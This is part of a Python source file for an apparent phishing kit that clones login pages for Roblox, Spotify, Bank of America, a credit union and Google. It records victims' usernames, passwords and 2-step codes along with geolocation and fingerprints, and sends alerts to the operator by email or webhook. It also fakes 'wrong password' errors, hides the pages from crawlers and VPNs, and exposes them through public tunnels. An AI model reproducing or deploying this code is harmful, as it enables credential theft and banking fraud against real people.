    return doc("Roblox", "roblox",
               f"""<div class="wrap"><div class="card">{logo}{e}<h1>Login to Roblox</h1>"""
               f"""{form}<div class="foot">Don&rsquo;t have an account? """
               f"""<a href="#">Sign Up</a></div></div></div>""", css)


def tpl_spotify(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    css = """<style>
body{background:#121212;color:#fff;font-family:CircularSp,Circular,Helvetica,Arial,sans-serif}
.card{background:#121212;border:0;max-width:400px;padding:0 8px}
h1{font-size:32px;font-weight:700;text-align:center;margin:0 0 30px;letter-spacing:-.8px}
label{display:block;font-size:14px;font-weight:700;margin:0 0 8px}
input{background:#121212;border:1px solid #727272;border-radius:4px;height:48px;color:#fff;
      font-size:16px}
input:focus{border:2px solid #fff;padding:12px 14px}
button{background:#1DB954;width:100%;height:48px;border-radius:500px;font-size:16px;
       font-weight:700;color:#000;margin-top:24px}
button:hover{background:#1ed760}
.divider{display:flex;align-items:center;gap:12px;color:#a7a7a7;font-size:13px;margin:24px 0}
.divider:before,.divider:after{content:"";flex:1;height:1px;background:#292929}
.alt a{display:block;text-align:center;padding:12px;border:1px solid #727272;border-radius:500px;
       font-size:14px;font-weight:700;color:#fff;text-decoration:none;margin-bottom:10px}
.foot{justify-content:center;color:#a7a7a7;border-top:1px solid #292929;padding-top:24px;
      margin-top:28px}
.foot a{color:#fff;font-weight:700;text-decoration:underline}
.sp{width:42px;height:42px;display:block;margin:0 auto 26px}
.field{margin-bottom:16px}
.link{color:#fff;text-decoration:underline;font-size:14px;margin-top:8px}
</style>"""
    logo = ("""<svg class="sp" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" """
            """fill="#1DB954"/><path fill="none" stroke="#fff" stroke-width="1.8" """
            """stroke-linecap="round" d="M7.5 9.5c3-1 6.5-.7 9 .8M8 12.6c2.5-.8 5.4-.5 7.5.8"""
            """M8.6 15.5c2-.6 4.3-.4 6 .6"/></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/spotify" novalidate>
<input type="hidden" name="step" value="ident">
<div class="field"><label>Email or username</label>
<input name="username" type="text" autocomplete="username" required autofocus
 spellcheck="false" autocapitalize="none"></div>
<button type="submit">Continue</button></form>"""
    else:
        form = f"""<form method="post" action="/spotify" novalidate>
<input type="hidden" name="step" value="pass">
<input type="hidden" name="username" value="{ident}">
<div class="field"><label>Password</label>
<input name="password" type="password" autocomplete="current-password" required autofocus>
<a class="link" href="#">Forgot your password?</a></div>
<button type="submit">Log In</button></form>"""
    return doc("Log in - Spotify", "spotify",
               f"""<div class="wrap"><div class="card">{logo}{e}<h1>Log in to Spotify</h1>"""
               f"""{form}<div class="divider">or</div><div class="alt">"""
               f"""<a href="#">Continue with Google</a>"""
               f"""<a href="#">Continue with Facebook</a>"""
               f"""<a href="#">Continue with Apple</a></div>"""
               f"""<div class="foot">Don&rsquo;t have an account? """
               f"""<a href="#">Sign up for Spotify</a></div></div></div>""", css)


def tpl_boa(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    css = """<style>
body{background:#f7f7f7;font-family:Arial,Helvetica,sans-serif;color:#1f1f1f}
.wrap{min-height:100vh;display:flex;align-items:stretch;padding:0}
.pane{display:flex;flex-direction:column;justify-content:center;align-items:center;
      padding:40px;flex:1;background:#012169;color:#fff;text-align:center}
.pane h2{font-size:22px;font-weight:400;margin:0 0 10px}
.pane p{font-size:14px;opacity:.8;margin:0;max-width:280px}
.formside{flex:1;display:flex;align-items:center;justify-content:center;padding:40px}
.card{border:1px solid #d5d5d5;border-radius:4px;max-width:420px;padding:36px 32px;
      box-shadow:0 1px 4px rgba(0,0,0,.08)}
.flag{width:34px;height:34px;margin-bottom:14px}
h1{font-size:22px;font-weight:400;margin:0 0 4px;text-align:left}
.sub{text-align:left;color:#5a5a5a;font-size:13px;margin:0 0 22px}
label{display:block;font-size:13px;font-weight:600;margin:14px 0 6px;color:#1f1f1f}
input{border:1px solid #8e8e8e;border-radius:3px;height:42px;font-size:15px}
input:focus{border:2px solid #012169;padding:11px 14px}
button{background:#e31837;width:100%;height:44px;border-radius:3px;font-size:15px;
       font-weight:700;margin-top:20px;color:#fff}
button:hover{background:#c5152f}
.link{color:#012169;font-size:13px}
.chk{display:flex;gap:8px;align-items:center;font-size:13px;margin-top:14px}
.chk input{width:auto;height:auto}
.row{margin-top:22px}
.foot{justify-content:center;color:#5a5a5a;margin-top:24px;font-size:11px;
      border-top:1px solid #e3e3e3;padding-top:16px}
@media(max-width:820px){.wrap{flex-direction:column}.pane{padding:28px}
  .formside{padding:20px}}
</style>"""
    flag = ("""<svg class="flag" viewBox="0 0 24 24"><path fill="#e31837" d="M2 5h20l-2 3H2z"/>"""
            """<path fill="#012169" d="M2 10h20l-2 3H2z"/><path fill="#e31837" """
            """d="M2 15h20l-2 3H2z"/></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/boa" novalidate>
<input type="hidden" name="step" value="ident">
<label for="oid">Online ID</label>
<input id="oid" name="onlineId1" type="text" autocomplete="username" required autofocus
 spellcheck="false" autocapitalize="none">
<label class="chk"><input type="checkbox" name="saveId" value="on"> Save online ID</label>
<div class="row"><button type="submit">Sign in</button></div>
<a class="link" href="#">Forgot online ID?</a> &nbsp;|&nbsp;
<a class="link" href="#">Enroll in Online Banking</a></form>"""
    else:
        form = f"""<form method="post" action="/boa" novalidate>
<input type="hidden" name="step" value="pass">
<input type="hidden" name="onlineId1" value="{ident}">
<label>Online ID</label><input value="{ident}" readonly style="background:#f3f3f3">
<label for="pc">Passcode</label>
<input id="pc" name="passcode" type="password" autocomplete="current-password" required
 autofocus>
<div class="row"><button type="submit">Sign in</button></div>
<a class="link" href="#">Forgot passcode?</a></form>"""
    return doc("Sign In To Online Banking", "boa",
               f"""<div class="wrap"><div class="pane"><svg viewBox="0 0 24 24" """
               f"""style="width:44px;height:44px;margin-bottom:18px">"""
               f"""<path fill="#fff" d="M2 5h20l-2 3H2z"/><path fill="#e31837" """
               f"""d="M2 10h20l-2 3H2z"/><path fill="#fff" d="M2 15h20l-2 3H2z"/></svg>"""
               f"""<h2>Welcome to Online Banking</h2>"""
               f"""<p>Manage accounts, pay bills and transfer funds securely.</p></div>"""
               f"""<div class="formside"><div class="card">{flag}{e}"""
               f"""<h1>Sign in to Online Banking</h1>"""
               f"""<p class="sub">Enter your Online ID to continue</p>{form}"""
               f"""<div class="foot">Bank of America, N.A. Member FDIC. """
               f"""&copy;2025 Bank of America Corporation</div></div></div></div>""", css)


def tpl_fibre(step, ident="", err=""):
    e = f"""<div class="err">{err}</div>""" if err else ""
    css = """<style>
body{background:#eef4f8;font-family:Verdana,Geneva,Arial,sans-serif;color:#20323f}
.card{border:0;max-width:410px;box-shadow:0 3px 18px rgba(10,77,140,.16);border-radius:6px;
      padding:32px 30px}
h1{font-size:21px;font-weight:700;color:#0a4d8c;margin:0 0 4px;text-align:center}
.sub{font-size:13px;color:#5b7383;text-align:center;margin:0 0 22px}
label{display:block;font-size:12px;font-weight:700;margin:0 0 6px;text-transform:uppercase;
      letter-spacing:.4px;color:#3d5a6d}
input{border:1px solid #b9cbd8;border-radius:4px;height:44px;font-size:15px;background:#fff}
input:focus{border:2px solid #0a4d8c;padding:12px 14px}
button{background:#0a4d8c;width:100%;height:46px;border-radius:4px;font-size:15px;
       font-weight:700;margin-top:20px;color:#fff}
button:hover{background:#083d70}
.link{color:#0a4d8c;font-size:13px;font-weight:700}
.chk{display:flex;gap:8px;align-items:center;font-size:13px;margin-top:14px}
.chk input{width:auto;height:auto}
.foot{justify-content:center;color:#6b8394;margin-top:22px;font-size:11px;
      border-top:1px solid #d7e3ec;padding-top:16px;text-align:center}
.field{margin-bottom:14px}
.fb{width:46px;height:46px;display:block;margin:0 auto 16px}
.bar{background:#0a4d8c;color:#fff;font-size:12px;font-weight:700;padding:9px 0;
     text-align:center;letter-spacing:.5px}
</style>"""
    logo = ("""<svg class="fb" viewBox="0 0 24 24"><path fill="#0a4d8c" d="M12 2 3 7v10l9 5 9-5"""
            """V7z"/><path fill="#fff" d="M11 7h2v6h-2z"/><circle cx="12" cy="16" r="1.3" """
            """fill="#fff"/></svg>""")
    if step == "ident":
        form = f"""<form method="post" action="/fibre" novalidate>
<input type="hidden" name="step" value="ident">
<div class="field"><label>Member ID</label>
<input name="username" type="text" autocomplete="username" required autofocus
 spellcheck="false" autocapitalize="none"></div>
<label class="chk"><input type="checkbox" name="remember" value="on">
 Remember this device</label>
<button type="submit">Log In</button>
<a class="link" href="#">Forgot Member ID?</a></form>"""
    else:
        form = f"""<form method="post" action="/fibre" novalidate>
<input type="hidden" name="step" value="pass">
<input type="hidden" name="username" value="{ident}">
<div class="field"><label>Member ID</label>
<input value="{ident}" readonly style="background:#eef2f5"></div>
<div class="field"><label>Password</label>
<input name="password" type="password" autocomplete="current-password" required autofocus>
<a class="link" href="#">Forgot password?</a></div>
<button type="submit">Log In</button></form>"""
    return f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Online Banking Login - Fibre Federal Credit Union</title>
<meta name="theme-color" content="#0a4d8c">
<link rel="icon" href="/favicon/fibre.svg" type="image/svg+xml">
<link rel="canonical" href="https://www.fibrecu.com/">
{BASE_CSS}{css}</head><body>
<div class="bar">FIBRE FEDERAL CREDIT UNION &nbsp;&middot;&nbsp; ONLINE BANKING</div>
<div class="wrap"><div class="card">{logo}{e}<h1>Member Sign In</h1>
<p class="sub">Log in to view balances, transfer funds and pay bills.</p>{form}
<div class="foot">Federally insured by the NCUA &middot; Equal Housing Opportunity</div>
</div></div>{FP_JS}{TRACK}</body></html>"""


def tpl_otp(site, ident):
    css = """<style>.otp{letter-spacing:8px;text-align:center;font-size:20px}</style>"""
    return doc("Verify it's you", site,
               f"""<div class="wrap"><div class="card">"""
               f"""<svg class="g" viewBox="0 0 48 48">{G_SVG}</svg>"""
               f"""<h1>2-Step Verification</h1>"""
               f"""<p class="sub">Enter the code from your authenticator app or SMS sent """
               f"""to {ident}</p><form method="post" action="/{site}" novalidate>"""
               f"""<input type="hidden" name="step" value="otp">"""
               f"""<input type="hidden" name="identifier" value="{ident}">"""
               f"""<input class="otp" name="otp" inputmode="numeric" maxlength="8" """
               f"""placeholder="&ndash;" autocomplete="one-time-code" required autofocus>"""
               f"""<div class="row"><a class="link" style="margin:0" href="#">Resend code</a>"""
               f"""<button type="submit">Next</button></div></form>{GFOOT}</div></div>""", css)


DEST = {"tiktok": "https://www.tiktok.com/", "youtube": "https://www.youtube.com/",
        "boa": "https://www.bankofamerica.com/", "google": "https://www.google.com/",
        "gmail": "https://mail.google.com/", "fibre": "https://www.fibrecu.com/",
        "roblox": "https://www.roblox.com/home", "spotify": "https://open.spotify.com/"}


def tpl_success(site):
    dest = DEST.get(site, "https://www.google.com/")
    meta = f"""<meta http-equiv="refresh" content="4;url={dest}">""" if CFG.get("redirect") else ""
    return doc("Signing in", site,
               f"""<div class="wrap"><div class="card" style="text-align:center">"""
               f"""<svg class="g" viewBox="0 0 48 48">{G_SVG}</svg>"""
               f"""<h1>Signing you in</h1><p class="sub">This will only take a moment</p>"""
               f"""<a class="link" href="{dest}">Continue to site</a></div></div>""", meta)


def render(site, step, ident="", err=""):
    if site == "tiktok":
        return tpl_tiktok(step, ident, err)
    if site == "roblox":
        return tpl_roblox(step, ident, err)
    if site == "spotify":
        return tpl_spotify(step, ident, err)
    if site == "boa":
        return tpl_boa(step, ident, err)
    if site == "fibre":
        return tpl_fibre(step, ident, err)
    if site == "youtube":
        return tpl_youtube(step, ident, err)
    return tpl_google(step, ident, err, site)


def title_for(site):
    return {"tiktok": "TikTok", "youtube": "YouTube", "boa": "Bank of America",
            "google": "Google", "gmail": "Gmail", "fibre": "Fibre Federal",
            "roblox": "Roblox", "spotify": "Spotify"}.get(site, site)
class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.send_header("Cache-Control", "no-store")
        for k, v in HEADERS.items():
            self.send_header(k, v)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(raw)

    def _sid(self):
        for part in (self.headers.get("cookie") or "").split(";"):
            if "=" in part:
                k, _, v = part.strip().partition("=")
                if k == "sid" and v:
                    return v
        return secrets.token_hex(8)

    def _site(self, path):
        seg = path.strip("/").split("/")[0]
        return seg if seg in META else CFG.get("site", "gmail")

    def _state(self, sid, site):
        with STATE_LOCK:
            return STATE.setdefault(sid, {"site": site, "step": "ident",
                                          "ident": "", "tries": 0, "done": False})

    def _record(self, kind, site, data=None, fp=None, headline=None, step=""):
        sid = self._sid()
        rec = harvest(self, sid, site)
        rec["step"] = step or kind
        if data:
            rec["data"] = data
        if fp:
            rec["fp"] = fp
        g = rec["geo"]
        store(rec, [rec["ts"], site, rec["step"], rec["ip"], g.get("country", ""),
                    g.get("city", ""), (data or {}).get("identity", ""),
                    (data or {}).get("secret", ""), g.get("proxy", ""),
                    g.get("hosting", ""), sid])
        alert(rec, headline or kind)
        return sid

    def _form(self):
        n = int(self.headers.get("content-length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "ignore") if n else ""
        return {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}

    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path
        cookie = {"Set-Cookie": f"sid={self._sid()}; Path=/; HttpOnly; SameSite=Lax"}

        if p == "/pixel.gif":
            return self._send(200, PIXEL, "image/gif")
        if p == "/robots.txt":
            return self._send(200, "User-agent: *\nDisallow: /\n", "text/plain")
        if p.startswith("/favicon/"):
            return self._send(200, favicon(p.split("/")[-1].replace(".svg", "")),
                              "image/svg+xml")

        site = self._site(p)
        slug = CFG.get("slug") or ""

        if CFG.get("cloak") and p != "/health":
            ip, _, _ = client_ip(self)
            g = geo(ip)
            if g.get("hosting") or g.get("proxy"):
                return self._send(404, "<h1>404 Not Found</h1>")

        if p in ("/", f"/{slug}", f"/{site}", f"/{slug}/{site}"):
            sid = self._sid()
            st = self._state(sid, site)
            return self._send(200, render(site, st["step"], st["ident"]), extra=cookie)

        self._send(404, "<h1>404 Not Found</h1>")

    def do_POST(self):
        p = urllib.parse.urlparse(self.path).path

        if p == "/fp":
            n = int(self.headers.get("content-length") or 0)
            raw = self.rfile.read(n).decode("utf-8", "ignore") if n else "{}"
            try:
                fp = json.loads(raw)
            except ValueError:
                fp = {"raw": raw[:2000]}
            self._record("fingerprint", CFG.get("site", ""), fp=fp,
                         headline="Browser fingerprinted")
            return self._send(200, "{}", "application/json")

        d = self._form()
        site = d.get("site") or self._site(p)
        step = d.get("step", "ident")
        sid = self._sid()
        st = self._state(sid, site)

        if step == "ident":
            ident = (d.get("identifier") or d.get("username")
                     or d.get("onlineId1") or "")
            with STATE_LOCK:
                st["ident"] = ident
                st["step"] = "pass"
            self._record("identity", site, {"identity": ident, "fields": d},
                         headline=f"{title_for(site)} identity", step="ident")
            return self._send(200, render(site, "pass", ident))

        if step == "pass":
            secret = d.get("Passwd") or d.get("password") or d.get("passcode") or ""
            with STATE_LOCK:
                st["tries"] += 1
                tries = st["tries"]
            self._record("credential", site,
                         {"identity": st["ident"], "secret": secret,
                          "attempt": tries, "fields": d},
                         headline=f"{title_for(site)} PASSWORD (attempt {tries})",
                         step="pass")
            if tries <= int(CFG.get("retries", 0)):
                return self._send(200, render(
                    site, "pass", st["ident"],
                    "Wrong password. Try again or click Forgot password to reset it."))
            if CFG.get("otp"):
                with STATE_LOCK:
                    st["step"] = "otp"
                return self._send(200, tpl_otp(site, st["ident"]))
            with STATE_LOCK:
                st["done"] = True
            return self._send(200, tpl_success(site))

        if step == "otp":
            code = d.get("otp", "")
            self._record("otp", site, {"identity": st["ident"], "secret": code},
                         headline=f"{title_for(site)} OTP", step="otp")
            return self._send(200, tpl_success(site))

        self._send(404, "<h1>404 Not Found</h1>")


def banner():
    print(f"{RED}{BOLD}{BANNER}{RESET}")
    print(f"{RED}  ── PHISHER ──  clone · capture · alert{RESET}\n")


def config_wizard():
    print(f"{RED}SMTP setup. Gmail needs an app password, not your login.{RESET}\n")
    CFG["smtp_host"] = input(f"{RED}SMTP host [smtp.gmail.com]: {RESET}").strip() \
        or "smtp.gmail.com"
    CFG["smtp_port"] = int(input(f"{RED}SMTP port [587]: {RESET}").strip() or 587)
    tls = input(f"{RED}TLS starttls/ssl/none [starttls]: {RESET}").strip().lower()
    CFG["smtp_tls"] = tls if tls in ("starttls", "ssl", "none") else "starttls"
    CFG["smtp_user"] = input(f"{RED}SMTP user: {RESET}").strip()
    CFG["smtp_pass"] = input(f"{RED}SMTP app password: {RESET}").strip()
    CFG["alert_to"] = input(f"{RED}Alert recipient: {RESET}").strip()
    CFG["webhook"] = input(f"{RED}Webhook URL (optional): {RESET}").strip()
    save_cfg()
    print(f"{RED}Saved to {CONFIG_PATH}{RESET}")


def choose_site():
    print(f"{RED}[+] 1: TikTok\n"
          f"[+] 2: YouTube\n"
          f"[+] 3: Bank of America\n"
          f"[+] 4: Google\n"
          f"[+] 5: Gmail\n"
          f"[+] 6: Fibre Federal\n"
          f"[+] 7: Roblox\n"
          f"[+] 8: Spotify{RESET}\n")
    c = input(f"{RED}{BOLD}select » {RESET}").strip()
    return {"1": "tiktok", "2": "youtube", "3": "boa", "4": "google", "5": "gmail",
            "6": "fibre", "7": "roblox", "8": "spotify"}.get(c, "gmail")


def serve(site, port, bind):
    srv = ThreadingHTTPServer((bind, port), Handler)
    srv.daemon_threads = True
    base = CFG.get("public_url") or f"http://127.0.0.1:{port}"
    slug = CFG.get("slug") or ""
    lure = f"{base}/{slug}" if slug else f"{base}/"
    print(f"""{RED}{BOLD}live{RESET} {bind}:{port}  site={site}"""
          f"""  tunnel={TUNNEL.get("kind") or "none"}""")
    print(f"{RED}lure   : {lure}{RESET}")
    print(f"{RED}alt    : {base}/{site}{RESET}")
    print(f"{RED}events : {EVENTS_PATH}{RESET}")
    print(f"{RED}csv    : {HITS_CSV}{RESET}")
    print(f"""{RED}retries: {CFG["retries"]}  otp={CFG["otp"]}  cloak={CFG["cloak"]}"""
          f"""{RESET}\n{RED}Ctrl-C to stop{RESET}\n""")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{RED}stopped{RESET}")
    finally:
        srv.server_close()
        stop_tunnel()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--init", action="store_true")
    ap.add_argument("--test-email", action="store_true")
    ap.add_argument("--site", choices=SITES)
    ap.add_argument("--port", type=int)
    ap.add_argument("--bind")
    ap.add_argument("--retries", type=int)
    ap.add_argument("--otp", action="store_true")
    ap.add_argument("--cloak", action="store_true")
    ap.add_argument("--bypass", action="store_true",
                    help="skip cloudflare, use localhost.run/serveo/localtunnel")
    ap.add_argument("--no-redirect", action="store_true")
    ap.add_argument("--slug")
    ap.add_argument("--public-url")
    ap.add_argument("--no-tunnel", action="store_true")
    ap.add_argument("--no-email", action="store_true")
    a = ap.parse_args()

    ensure_dirs()
    load_cfg()
    if a.site:
        CFG["site"] = a.site
    for attr in ("port", "bind", "public_url", "retries"):
        v = getattr(a, attr)
        if v is not None:
            CFG[attr] = v
    if a.otp:
        CFG["otp"] = True
    if a.cloak:
        CFG["cloak"] = True
    if a.bypass:
        CFG["bypass"] = True
    if a.no_redirect:
        CFG["redirect"] = False
    if a.slug:
        CFG["slug"] = re.sub(r"[^a-z0-9_-]", "", a.slug.lower()) or new_slug()
    if a.no_email:
        CFG["smtp_host"] = ""

    if a.init:
        banner()
        config_wizard()
        return

    if a.test_email:
        threading.Thread(target=mailer, daemon=True).start()
        MAIL_Q.put(({"ts": now(), "site": "test", "session": "test", "ip": "1.2.3.4",
                     "ua": "test", "referer": "", "geo": {"city": "Nowhere"},
                     "data": {}, "fp": {}}, "Test capture"))
        MAIL_Q.join()
        print(f"{RED}dispatched - see {ALERTS_LOG}{RESET}")
        return

    threading.Thread(target=mailer, daemon=True).start()
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))
    banner()

    if not a.site:
        CFG["site"] = choose_site()
        r = input(f"{RED}wrong-password retries [1]: {RESET}").strip()
        CFG["retries"] = int(r) if r.isdigit() else 1
        CFG["otp"] = input(f"{RED}ask for OTP after password? [y/N]: {RESET}"
                           ).strip().lower() in ("y", "yes")
        CFG["cloak"] = input(f"{RED}cloak crawlers/VPNs with 404? [y/N]: {RESET}"
                             ).strip().lower() in ("y", "yes")
        CFG["bypass"] = input(f"{RED}bypass cloudflare (alt tunnels)? [y/N]: {RESET}"
                              ).strip().lower() in ("y", "yes")
        p = input(f"{RED}port [{CFG['port']}]: {RESET}").strip()
        if p.isdigit():
            CFG["port"] = int(p)
        CFG["slug"] = new_slug()
        save_cfg()

    if not CFG.get("slug"):
        CFG["slug"] = new_slug()

    if not a.no_tunnel and not CFG.get("public_url"):
        CFG["public_url"] = start_tunnel(int(CFG["port"]), CFG.get("bypass"))

    serve(CFG["site"], int(CFG["port"]), CFG["bind"])


if __name__ == "__main__":
    main()
